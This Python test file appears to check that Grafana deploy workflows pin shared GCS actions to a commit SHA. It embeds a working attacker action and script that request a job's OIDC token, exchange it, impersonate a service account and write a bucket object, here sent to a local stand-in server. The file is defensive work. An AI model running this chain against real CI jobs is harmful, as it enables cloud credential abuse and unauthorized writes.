"""Spec for the unpinned frontend-preview GCS upload.

The deploy job in deploy-frontend-preview.yml grants id-token: write and
uploads with grafana/shared-workflows/actions/push-to-gcs at a moving ref.
These tests resolve that ref the way actions/runner asks GitHub to download
it, then run the tree that ref points at after main has moved. They fail
while that tree can request the job OIDC token, exchange it, and write an
object as the preview service account. Pinning each such step to a full
commit SHA makes the moved branch invisible to the resolver, and the tests
pass.

Run from the repository root:

    python3 -m unittest .github/workflows/deploy_frontend_preview_unpinned_action_test.py
"""

from __future__ import annotations

import http.server
import json
import os
import re
import shutil
import subprocess
import tempfile
import threading
import unittest
import urllib.parse
from pathlib import Path

import yaml

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"
PREVIEW_WORKFLOW = WORKFLOWS / "deploy-frontend-preview.yml"
ACTION_REPO = "https://github.com/grafana/shared-workflows.git"
ACTION_OWNER = "grafana/shared-workflows"

# login-to-gcs/action.yaml (shared-workflows 6a943082) passes this provider to
# google-github-actions/auth, which uses it as the OIDC audience and the STS
# audience. The value is not a credential.
WIF_PROVIDER = (
    "projects/304398677251/locations/global/"
    "workloadIdentityPools/github/providers/github-provider"
)
OIDC_AUDIENCE = f"https://iam.googleapis.com/{WIF_PROVIDER}"
STS_AUDIENCE = f"//iam.googleapis.com/{WIF_PROVIDER}"
CLOUD_PLATFORM_SCOPE = "https://www.googleapis.com/auth/cloud-platform"

REQUEST_TOKEN = "placeholder-id-token-request"
OIDC_JWT = "placeholder-oidc-jwt"
FEDERATED_ACCESS_TOKEN = "placeholder-federated-access-token"
SERVICE_ACCOUNT_ACCESS_TOKEN = "placeholder-service-account-access-token"

SHA_RE = re.compile(r"^[0-9a-f]{40}$")
USES_RE = re.compile(r"^([^/]+/[^/]+)/(.+)@(.+)$")
EXPR_RE = re.compile(r"\$\{\{\s*(.*?)\s*\}\}")


ATTACKER_ACTION = """name: Push to cloud storage
description: Replacement of the action at the ref the workflow runs
inputs:
  bucket:
    default: ""
  path:
    default: ""
  bucket_path:
    default: ""
  environment:
    default: dev
  service_account:
    default: ""
runs:
  using: composite
  steps:
    - name: Use the job OIDC token to impersonate the given service account
      shell: bash
      env:
        SERVICE_ACCOUNT: ${{ inputs.service_account }}
        BUCKET: ${{ inputs.bucket }}
        BUCKET_PATH: ${{ inputs.bucket_path }}
      run: python3 "$GITHUB_ACTION_PATH/impersonate.py"
"""


ATTACKER_SCRIPT = r'''
import json
import os
import urllib.parse
import urllib.request

PROVIDER = (
    "projects/304398677251/locations/global/"
    "workloadIdentityPools/github/providers/github-provider"
)
AUDIENCE = "https://iam.googleapis.com/" + PROVIDER
STS_AUDIENCE = "//iam.googleapis.com/" + PROVIDER
SCOPE = "https://www.googleapis.com/auth/cloud-platform"

request_token = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
request_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
# @actions/core 1.11.1 oidc-utils.js appends the audience with "&".
token_url = request_url + "&audience=" + urllib.parse.quote(AUDIENCE, safe="")
oidc_request = urllib.request.Request(
    token_url, headers={"Authorization": "Bearer " + request_token}
)
with urllib.request.urlopen(oidc_request) as response:
    oidc_jwt = json.load(response)["value"]

# google-auth-library 9.15.1 StsCredentials.exchangeToken form body.
form = urllib.parse.urlencode(
    {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "audience": STS_AUDIENCE,
        "scope": SCOPE,
        "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
        "subject_token": oidc_jwt,
        "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
    }
)
sts_request = urllib.request.Request(
    os.environ["STANDIN_STS_URL"],
    data=form.encode(),
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)
with urllib.request.urlopen(sts_request) as response:
    federated = json.load(response)["access_token"]

service_account = os.environ["SERVICE_ACCOUNT"]
impersonate = (
    os.environ["STANDIN_IAM_URL"].rstrip("/")
    + "/projects/-/serviceAccounts/"
    + urllib.parse.quote(service_account, safe="")
    + ":generateAccessToken"
)
# google-auth-library BaseExternalAccountClient.getImpersonatedAccessToken.
iam_body = json.dumps({"scope": [SCOPE], "lifetime": "3600s"}).encode()
iam_request = urllib.request.Request(
    impersonate,
    data=iam_body,
    headers={
        "Authorization": "Bearer " + federated,
        "Content-Type": "application/json",
    },
)
with urllib.request.urlopen(iam_request) as response:
    access = json.load(response)["accessToken"]

bucket = os.environ["BUCKET"]
object_name = "unpinned-action-extra-object"
# @google-cloud/storage 7.17.0 resumable-upload createURIAsync.
upload = (
    os.environ["STANDIN_STORAGE_URL"].rstrip("/")
    + "/upload/storage/v1/b/"
    + urllib.parse.quote(bucket, safe="")
    + "/o?uploadType=resumable&name="
    + urllib.parse.quote(object_name, safe="")
)
start = urllib.request.Request(
    upload,
    data=b"{}",
    method="POST",
    headers={
        "Authorization": "Bearer " + access,
        "Content-Type": "application/json",
    },
)
with urllib.request.urlopen(start) as response:
    location = response.headers["Location"]
put = urllib.request.Request(
    location,
    data=b"replaced-by-unpinned-action",
    method="PUT",
    headers={
        "Authorization": "Bearer " + access,
        "Content-Type": "application/octet-stream",
    },
)
with urllib.request.urlopen(put) as response:
    response.read()
'''


class CloudStandIn(http.server.BaseHTTPRequestHandler):
    """Local stand-in for the OIDC, STS, IAM, and GCS calls those libraries make."""

    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        return

    @property
    def state(self):
        return self.server.state

    def _read_json(self):
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length) if length else b""
        if not raw:
            return {}
        content_type = self.headers.get("Content-Type", "")
        if content_type.startswith("application/x-www-form-urlencoded"):
            return dict(urllib.parse.parse_qsl(raw.decode()))
        return json.loads(raw.decode())

    def _send(self, status, payload=None, headers=None):
        body = b"" if payload is None else json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        for key, value in (headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def _bearer(self):
        header = self.headers.get("Authorization", "")
        prefix = "Bearer "
        if not header.startswith(prefix):
            return ""
        return header[len(prefix) :]

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/oidc":
            self._send(404, {"error": "not found"})
            return
        if self._bearer() != REQUEST_TOKEN:
            self._send(401, {"error": "request token rejected"})
            return
        query = urllib.parse.parse_qs(parsed.query)
        audience = urllib.parse.unquote(query.get("audience", [""])[0])
        if audience != OIDC_AUDIENCE:
            self._send(400, {"error": "audience mismatch", "audience": audience})
            return
        # oidc-utils.js reads result.value.
        self._send(200, {"value": OIDC_JWT})

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        body = self._read_json()
        if parsed.path == "/sts/token":
            if body.get("subject_token") != OIDC_JWT:
                self._send(401, {"error": "subject token rejected"})
                return
            if body.get("grant_type") != "urn:ietf:params:oauth:grant-type:token-exchange":
                self._send(400, {"error": "grant type rejected"})
                return
            if body.get("audience") != STS_AUDIENCE:
                self._send(400, {"error": "sts audience rejected"})
                return
            self._send(200, {"access_token": FEDERATED_ACCESS_TOKEN, "expires_in": 3600})
            return
        marker = "/projects/-/serviceAccounts/"
        if parsed.path.startswith("/iamcredentials/v1" + marker) and parsed.path.endswith(
            ":generateAccessToken"
        ):
            if self._bearer() != FEDERATED_ACCESS_TOKEN:
                self._send(401, {"error": "federated token rejected"})
                return
            encoded = parsed.path[
                len("/iamcredentials/v1" + marker) : -len(":generateAccessToken")
            ]
            service_account = urllib.parse.unquote(encoded)
            if body.get("scope") != [CLOUD_PLATFORM_SCOPE] or body.get("lifetime") != "3600s":
                self._send(400, {"error": "impersonation body rejected"})
                return
            if self.state["mutable"]:
                self.state["impersonations"].append(service_account)
            self._send(
                200,
                {
                    "accessToken": SERVICE_ACCOUNT_ACCESS_TOKEN,
                    "expireTime": "2099-01-01T00:00:00Z",
                },
            )
            return
        if parsed.path.startswith("/storage/upload/storage/v1/b/") and parsed.path.endswith("/o"):
            if self._bearer() != SERVICE_ACCOUNT_ACCESS_TOKEN:
                self._send(401, {"error": "service account token rejected"})
                return
            bucket = urllib.parse.unquote(
                parsed.path[len("/storage/upload/storage/v1/b/") : -len("/o")]
            )
            name = urllib.parse.parse_qs(parsed.query).get("name", [""])[0]
            session = f"/storage/session/{len(self.state['sessions'])}"
            self.state["sessions"][session] = (bucket, name)
            self._send(200, {}, headers={"Location": f"http://127.0.0.1:{self.server.server_address[1]}{session}"})
            return
        self._send(404, {"error": "not found"})

    def do_PUT(self):
        parsed = urllib.parse.urlparse(self.path)
        length = int(self.headers.get("Content-Length", "0"))
        payload = self.rfile.read(length) if length else b""
        if self._bearer() != SERVICE_ACCOUNT_ACCESS_TOKEN:
            self._send(401, {"error": "service account token rejected"})
            return
        located = self.state["sessions"].get(parsed.path)
        if located is None:
            self._send(404, {"error": "upload session missing"})
            return
        bucket, name = located
        if self.state["mutable"]:
            self.state["objects"].append(
                {"bucket": bucket, "name": name, "body": payload.decode()}
            )
        self._send(200, {"bucket": bucket, "name": name})


class StandInServer:
    def __init__(self):
        self.state = {"mutable": False, "impersonations": [], "objects": [], "sessions": {}}
        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), CloudStandIn)
        self.httpd.state = self.state
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        self.port = self.httpd.server_address[1]

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()

    def env(self):
        base = f"http://127.0.0.1:{self.port}"
        return {
            "ACTIONS_ID_TOKEN_REQUEST_URL": f"{base}/oidc?job=preview",
            "ACTIONS_ID_TOKEN_REQUEST_TOKEN": REQUEST_TOKEN,
            # Hosts stand in for sts.googleapis.com, iamcredentials.googleapis.com,
            # and storage.googleapis.com. Paths and bodies stay those of the libraries.
            "STANDIN_STS_URL": f"{base}/sts/token",
            "STANDIN_IAM_URL": f"{base}/iamcredentials/v1",
            "STANDIN_STORAGE_URL": f"{base}/storage",
        }


def git(repo, *args, check=True):
    result = subprocess.run(
        ["git", "-C", str(repo), *args],
        check=False,
        text=True,
        capture_output=True,
    )
    if check and result.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {result.stderr}")
    return result


def clone_action_repo(destination: Path) -> None:
    subprocess.run(
        [
            "git",
            "clone",
            "--depth",
            "1",
            "--filter=blob:none",
            ACTION_REPO,
            str(destination),
        ],
        check=True,
        text=True,
        capture_output=True,
    )


def commit_attacker(repo: Path) -> str:
    honest = git(repo, "rev-parse", "HEAD").stdout.strip()
    for relative in ("actions/push-to-gcs", "actions/login-to-gcs"):
        directory = repo / relative
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "action.yaml").write_text(ATTACKER_ACTION)
        (directory / "impersonate.py").write_text(ATTACKER_SCRIPT)
        git(repo, "add", f"{relative}/action.yaml", f"{relative}/impersonate.py")
    git(
        repo,
        "-c",
        "user.email=attacker@example.com",
        "-c",
        "user.name=Attacker",
        "commit",
        "-m",
        "Replace the GCS actions",
    )
    return honest


def ensure_commit(repo: Path, ref: str) -> None:
    if not SHA_RE.fullmatch(ref):
        return
    found = git(repo, "cat-file", "-t", ref, check=False)
    if found.returncode == 0:
        return
    git(repo, "fetch", "--depth", "1", "origin", ref)


def extract_action(repo: Path, ref: str, action_path: str, destination: Path) -> None:
    archive = subprocess.run(
        ["git", "-C", str(repo), "archive", ref, action_path],
        check=True,
        capture_output=True,
    )
    destination.mkdir(parents=True, exist_ok=True)
    subprocess.run(["tar", "-x", "-C", str(destination)], input=archive.stdout, check=True)


def load_workflow(path: Path):
    # PyYAML treats the bare key "on" as boolean true. Workflow files use it
    # as the trigger map.
    data = yaml.safe_load(path.read_text())
    if True in data and "on" not in data:
        data["on"] = data.pop(True)
    return data


def parse_uses(uses: str):
    match = USES_RE.fullmatch(uses.strip())
    if not match:
        return None
    owner, path, ref = match.groups()
    return owner, path, ref


def lookup(context, expression: str):
    expression = expression.strip()
    if (expression.startswith("'") and expression.endswith("'")) or (
        expression.startswith('"') and expression.endswith('"')
    ):
        return expression[1:-1]
    if expression == "true":
        return True
    if expression == "false":
        return False
    if expression == "null":
        return None
    if re.fullmatch(r"-?\d+", expression):
        return int(expression)
    parts = expression.split(".")
    value = context
    index = 0
    while index < len(parts):
        part = parts[index]
        if part == "*" and isinstance(value, list):
            rest = ".".join(parts[index + 1 :])
            return [lookup(item, rest) if rest else item for item in value]
        if isinstance(value, dict) and part in value:
            value = value[part]
        else:
            return None
        index += 1
    return value


def tokenize(expression: str):
    tokens = []
    index = 0
    while index < len(expression):
        char = expression[index]
        if char.isspace():
            index += 1
            continue
        for operator in ("==", "!=", "&&", "||"):
            if expression.startswith(operator, index):
                tokens.append(operator)
                index += len(operator)
                break
        else:
            if char in "(),!":
                tokens.append(char)
                index += 1
                continue
            if char in "'\"":
                quote = char
                index += 1
                start = index
                while index < len(expression) and expression[index] != quote:
                    index += 1
                tokens.append(quote + expression[start:index] + quote)
                index += 1
                continue
            start = index
            while index < len(expression) and expression[index] not in " \t\n(),!":
                if expression.startswith(("==", "!=", "&&", "||"), index):
                    break
                index += 1
            tokens.append(expression[start:index])
    return tokens


def eval_tokens(tokens, context):
    position = 0

    def peek():
        return tokens[position] if position < len(tokens) else None

    def take():
        nonlocal position
        token = tokens[position]
        position += 1
        return token

    def parse_or():
        value = parse_and()
        while peek() == "||":
            take()
            right = parse_and()
            value = bool(value) or bool(right)
        return value

    def parse_and():
        value = parse_not()
        while peek() == "&&":
            take()
            right = parse_not()
            value = bool(value) and bool(right)
        return value

    def parse_not():
        if peek() == "!":
            take()
            return not bool(parse_not())
        return parse_compare()

    def parse_compare():
        value = parse_primary()
        if peek() in ("==", "!="):
            operator = take()
            right = parse_primary()
            return value == right if operator == "==" else value != right
        return value

    def parse_primary():
        token = peek()
        if token == "(":
            take()
            value = parse_or()
            if take() != ")":
                raise AssertionError(f"missing closing parenthesis in {tokens}")
            return value
        token = take()
        if peek() == "(":
            take()
            args = []
            if peek() != ")":
                args.append(parse_or())
                while peek() == ",":
                    take()
                    args.append(parse_or())
            if take() != ")":
                raise AssertionError(f"missing closing parenthesis after {token}")
            return call_function(token, args)
        return lookup(context, token)

    value = parse_or()
    if position != len(tokens):
        raise AssertionError(f"unparsed expression {tokens[position:]} from {tokens}")
    return value


def call_function(name, args):
    if name == "startsWith":
        return str(args[0] or "").startswith(str(args[1]))
    if name == "contains":
        haystack, needle = args
        if isinstance(haystack, list):
            return needle in haystack
        return str(needle) in str(haystack or "")
    if name == "cancelled":
        return False
    raise AssertionError(f"unsupported expression function {name}")


def evaluate(expression, context):
    text = expression.strip()
    if text.startswith("${{") and text.endswith("}}"):
        text = text[3:-2]
    return bool(eval_tokens(tokenize(text), context))


def substitute(value, context):
    if not isinstance(value, str):
        return value

    def replace(match):
        found = lookup(context, match.group(1))
        return "" if found is None else str(found)

    return EXPR_RE.sub(replace, value)


def run_bash(script: str, env: dict, cwd: Path) -> subprocess.CompletedProcess:
    with tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False) as handle:
        handle.write(script)
        script_path = handle.name
    try:
        return subprocess.run(
            ["bash", "--noprofile", "--norc", "-eo", "pipefail", script_path],
            cwd=cwd,
            env=env,
            text=True,
            capture_output=True,
            check=False,
        )
    finally:
        os.unlink(script_path)


def execute_action(tree: Path, action_path: str, inputs: dict, standin: StandInServer, mutable: bool):
    manifest_path = tree / action_path / "action.yml"
    if not manifest_path.exists():
        manifest_path = tree / action_path / "action.yaml"
    manifest = yaml.safe_load(manifest_path.read_text())
    if manifest.get("runs", {}).get("using") != "composite":
        raise AssertionError(f"{action_path} is not a composite action")
    standin.state["mutable"] = mutable
    outputs = {}
    for step in manifest["runs"].get("steps", []):
        step_inputs = {
            "inputs": inputs,
            "env": {},
            "steps": outputs,
            "github": {"repository": "grafana/grafana"},
        }
        if "if" in step and not evaluate(str(step["if"]), step_inputs):
            continue
        if "uses" in step:
            # Nested actions are resolved on their own. The honest action pins
            # them. A mutable parent is already the code under test.
            continue
        if "run" not in step:
            continue
        output_file = tempfile.NamedTemporaryFile("w", delete=False)
        output_file.close()
        env = {
            "PATH": os.environ["PATH"],
            "HOME": os.environ.get("HOME", "/tmp"),
            "GITHUB_ACTION_PATH": str(tree / action_path),
            "GITHUB_OUTPUT": output_file.name,
            "GITHUB_WORKSPACE": str(tree),
        }
        # id-token: write makes the runner inject these into every step. The
        # stand-in records impersonation and object writes only while the
        # action ref being executed is mutable.
        if standin is not None:
            env.update(standin.env())
        for key, raw in (step.get("env") or {}).items():
            env[key] = substitute(str(raw), step_inputs)
        script = substitute(str(step["run"]), step_inputs)
        result = run_bash(script, env, tree)
        if result.returncode != 0:
            detail = result.stderr or result.stdout
            raise AssertionError(f"action step failed ({action_path}): {detail}")
        step_outputs = {}
        for line in Path(output_file.name).read_text().splitlines():
            if "=" in line:
                key, raw = line.split("=", 1)
                step_outputs[key] = raw
        os.unlink(output_file.name)
        if "id" in step:
            outputs[step["id"]] = {"outputs": step_outputs}
    standin.state["mutable"] = False


def workflow_steps(workflow, job_name):
    job = workflow["jobs"][job_name]
    return job, job.get("steps") or []


def shared_gcs_steps(steps):
    found = []
    for index, step in enumerate(steps):
        uses = step.get("uses")
        if not uses:
            continue
        parsed = parse_uses(uses)
        if not parsed:
            continue
        owner, path, ref = parsed
        if owner != ACTION_OWNER:
            continue
        if path not in ("actions/push-to-gcs", "actions/login-to-gcs"):
            continue
        found.append((index, step, path, ref))
    return found


def job_has_id_token(job) -> bool:
    permissions = job.get("permissions") or {}
    return permissions.get("id-token") == "write"


def simulate_steps(workflow, job_name, repo: Path, contexts: dict, standin: StandInServer):
    job, steps = workflow_steps(workflow, job_name)
    if not job_has_id_token(job):
        raise AssertionError(f"{job_name} does not grant id-token: write")
    step_outputs = {}
    for index, step, action_path, ref in shared_gcs_steps(steps):
        ensure_commit(repo, ref)
        mutable = SHA_RE.fullmatch(ref) is None
        context = {
            "env": contexts.get("env", {}),
            "steps": step_outputs,
            "inputs": contexts.get("inputs", {}),
            "github": contexts.get("github", {"repository": "grafana/grafana"}),
        }
        inputs = {}
        for key, raw in (step.get("with") or {}).items():
            inputs[key] = substitute(str(raw), context)
        with tempfile.TemporaryDirectory() as extracted:
            extract_action(repo, ref, action_path, Path(extracted))
            # id-token: write is what makes the runner inject the OIDC env.
            # Mutable trees receive it. A full SHA is the pinned upload.
            previous = os.environ.get("PYTEST_UNUSED")
            execute_action(Path(extracted), action_path, inputs, standin, mutable)
            if previous is None:
                os.environ.pop("PYTEST_UNUSED", None)
        step_outputs[step.get("id") or f"step-{index}"] = {"outputs": {}}
    return standin.state


def run_preview_check(pr_body: dict, files: list[str]) -> str:
    action = yaml.safe_load(
        (REPO_ROOT / ".github/actions/frontend-preview-check/action.yml").read_text()
    )
    script = action["runs"]["steps"][0]["run"]
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        gh_path = root / "gh"
        gh_path.write_text(
            "#!/usr/bin/env python3\n"
            "import json, sys\n"
            f"files = {files!r}\n"
            f"pr = {json.dumps(pr_body)}\n"
            "url = next(arg for arg in sys.argv[1:] if arg.startswith('repos/'))\n"
            "if url.endswith('/files'):\n"
            "    print('\\n'.join(files))\n"
            "else:\n"
            "    print(json.dumps(pr))\n"
        )
        gh_path.chmod(0o755)
        output = root / "output"
        env = {
            "PATH": f"{root}:{os.environ['PATH']}",
            "HOME": os.environ.get("HOME", "/tmp"),
            "GH_TOKEN": "placeholder-github-token",
            "PR_NUMBER": "123",
            "REPO": "grafana/grafana",
            "GITHUB_OUTPUT": str(output),
        }
        result = run_bash(script, env, root)
        if result.returncode != 0:
            raise AssertionError(result.stderr or result.stdout)
        values = {}
        for line in output.read_text().splitlines():
            key, raw = line.split("=", 1)
            values[key] = raw
        return values["should-deploy"]


def preview_context(event_name: str):
    if event_name == "issue_comment":
        return {
            "repository": "grafana/grafana",
            "event_name": "issue_comment",
            "event": {
                "issue": {"pull_request": {"url": "https://example.test/pull/123"}},
                "comment": {
                    "body": "/deploy-to-fs",
                    "author_association": "MEMBER",
                },
            },
        }
    return {
        "repository": "grafana/grafana",
        "event_name": "pull_request",
        "event": {
            "pull_request": {
                "head": {"repo": {"fork": False}},
                "labels": [{"name": "deploy-frontend-preview"}],
            }
        },
    }


def preview_job_selected(workflow, event_name: str) -> bool:
    check = workflow["jobs"]["check"]
    selected = evaluate(check["if"], {"github": preview_context(event_name)})
    return selected


class UnpinnedPreviewUploadTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.cache = Path(tempfile.mkdtemp(prefix="shared-workflows-"))
        clone_action_repo(cls.cache)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.cache, ignore_errors=True)

    def fresh_repo(self) -> Path:
        destination = Path(tempfile.mkdtemp(prefix="action-repo-"))
        self.addCleanup(shutil.rmtree, destination, True)
        subprocess.run(
            ["git", "clone", "--shared", str(self.cache), str(destination)],
            check=True,
            capture_output=True,
        )
        return destination

    def test_member_comment_and_labeled_push_select_the_deploy_job(self):
        workflow = load_workflow(PREVIEW_WORKFLOW)
        self.assertIn("created", workflow["on"]["issue_comment"]["types"])
        self.assertIn("synchronize", workflow["on"]["pull_request"]["types"])
        self.assertTrue(preview_job_selected(workflow, "issue_comment"))
        self.assertTrue(preview_job_selected(workflow, "pull_request"))
        non_fork = {
            "head": {
                "sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "repo": {"full_name": "grafana/grafana"},
            }
        }
        self.assertEqual(
            run_preview_check(non_fork, ["public/app/features/example.tsx"]),
            "true",
        )
        fork = {
            "head": {
                "sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                "repo": {"full_name": "example/grafana"},
            }
        }
        self.assertEqual(
            run_preview_check(fork, ["public/app/features/example.tsx"]),
            "false",
        )

    def test_moved_main_cannot_impersonate_the_preview_service_account(self):
        workflow = load_workflow(PREVIEW_WORKFLOW)
        deploy = workflow["jobs"]["deploy"]
        token_jobs = [
            name for name, job in workflow["jobs"].items() if job_has_id_token(job)
        ]
        self.assertEqual(token_jobs, ["deploy"])
        refs = [ref for _, _, _, ref in shared_gcs_steps(deploy["steps"])]
        self.assertEqual(refs, ["main", "main", "main"])
        repo = self.fresh_repo()
        commit_attacker(repo)
        standin = StandInServer()
        self.addCleanup(standin.close)
        # The three upload steps run after the local deploy-name step. The
        # bucket path is derived here the same way that step writes it.
        simulate_steps(
            workflow,
            "deploy",
            repo,
            {
                "env": {
                    "BUCKET_NAME": deploy["env"]["BUCKET_NAME"],
                    "PREVIEW_STACK_URL": deploy["env"]["PREVIEW_STACK_URL"],
                },
                "steps": {"deploy-name": {"outputs": {"deploy-name": "pr_grafana_123"}}},
            },
            standin,
        )
        self.assertEqual(
            standin.state["impersonations"],
            [],
            "a change on shared-workflows main impersonated the preview service account",
        )
        self.assertEqual(
            standin.state["objects"],
            [],
            "a change on shared-workflows main wrote an object with the preview service account",
        )

    def test_pinning_push_to_gcs_ignores_a_later_main_commit(self):
        workflow = load_workflow(PREVIEW_WORKFLOW)
        repo = self.fresh_repo()
        honest = commit_attacker(repo)
        pinned = yaml.safe_load(yaml.safe_dump(workflow))
        for step in pinned["jobs"]["deploy"]["steps"]:
            uses = step.get("uses")
            parsed = parse_uses(uses) if uses else None
            if parsed and parsed[0] == ACTION_OWNER and parsed[1] == "actions/push-to-gcs":
                step["uses"] = f"{ACTION_OWNER}/actions/push-to-gcs@{honest}"
        standin = StandInServer()
        self.addCleanup(standin.close)
        simulate_steps(
            pinned,
            "deploy",
            repo,
            {
                "env": {"BUCKET_NAME": "grafana-frontend-preview-dev"},
                "steps": {"deploy-name": {"outputs": {"deploy-name": "pr_grafana_123"}}},
            },
            standin,
        )
        self.assertEqual(standin.state["impersonations"], [])
        self.assertEqual(standin.state["objects"], [])

    def test_other_unpinned_gcs_uploads_cannot_impersonate_their_service_accounts(self):
        cases = [
            (
                "deploy-storybook-preview.yml",
                "deploy-storybook-preview",
                {
                    "env": {"BUCKET_NAME": "grafana-storybook-previews"},
                    "steps": {
                        "create-deploy-name": {
                            "outputs": {"deploy-name": "pr_123_branch"}
                        }
                    },
                },
            ),
            (
                "deploy-storybook.yml",
                "deploy-storybook",
                {
                    "env": {"BUCKET_NAME": "grafana-storybook", "VERSION": ""},
                    "steps": {
                        "create-deploy-name": {"outputs": {"deploy-name": "canary"}}
                    },
                },
            ),
            (
                "publish-artifact.yml",
                "publish",
                {
                    "inputs": {
                        "bucket": "grafana-prerelease",
                        "bucket-path": "build",
                        "environment": "dev",
                        "service-account": (
                            "github-prerelease-writer@grafanalabs-workload-identity.iam.gserviceaccount.com"
                        ),
                    }
                },
            ),
        ]
        for filename, job_name, context in cases:
            with self.subTest(workflow=filename, job=job_name):
                workflow = load_workflow(WORKFLOWS / filename)
                repo = self.fresh_repo()
                commit_attacker(repo)
                standin = StandInServer()
                self.addCleanup(standin.close)
                simulate_steps(workflow, job_name, repo, context, standin)
                self.assertEqual(standin.state["impersonations"], [])
                self.assertEqual(standin.state["objects"], [])


if __name__ == "__main__":
    unittest.main()
